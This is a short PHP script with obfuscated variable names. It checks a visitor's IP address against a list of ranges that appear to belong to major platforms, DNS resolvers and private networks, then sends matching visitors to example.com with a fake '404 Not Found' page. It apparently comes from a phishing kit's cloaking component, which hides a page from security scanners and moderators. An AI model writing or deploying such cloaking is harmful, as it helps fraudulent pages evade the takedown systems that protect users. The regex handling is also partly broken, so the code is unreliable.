<?php 
$c28dd9c = $_SERVER['REMOTE_ADDR'];
$c97h77ec = array(
    "^192.168.1.*", 
    "^172.16.*.*", 
    "^10.0.*.*",
    "^203.0.113.*", 
    "^198.51.100.*", 
    "^185.60.*.*",
    "^202.54.*.*",
    "^103.21.*.*",
    "^45.79.*.*",
    "^103.100.*.*",
    "^198.18.*.*",
    "^203.123.*.*",
    "^198.51.*.*",
    "^192.88.99.*",
    "^8.8.8.*",
    "^23.227.*.*",
    "^69.63.*.*",
    "^74.120.*.*",
    "^138.197.*.*",
    "^104.28.*.*",
    "^157.240.*.*",
    "^154.54.*.*",
    "^205.251.*.*",
    "^104.244.*.*",
    "^64.233.*.*",
    "^216.58.*.*"
);

if (in_array($c28dd9c, $c97h77ec)) {
    exit(header('Location: https://www.example.com/'));
} else {
    foreach ($c97h77ec as $a4nde) {
        if (preg_match('/' . $a4nde . '/', $c28dd9c)) {
            header('Location: https://www.example.com/');
            echo("<h1>404 Not Found</h1>The page that you have requested could not be found.");
            exit;
        }
    }
}
?>
